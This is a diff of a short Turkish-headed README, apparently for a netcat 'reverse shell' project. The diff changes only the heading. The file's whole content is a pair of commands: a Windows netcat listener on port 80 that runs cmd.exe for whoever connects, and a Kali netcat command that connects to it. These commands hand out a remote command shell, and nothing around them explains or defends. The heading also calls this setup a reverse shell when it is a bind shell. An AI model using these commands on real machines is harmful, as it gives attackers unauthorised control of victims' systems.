@@ -1,5 +1,5 @@
 # netcat_sbd
-# NETCAT İLE REVERSE SHELL /n
+# NETCAT İLE REVERSE SHELL ##
 Kali Linux : netcat -vvn <ip> <port>
 Windows  : netcat.exe -lvp 80 -e cmd.exe
 
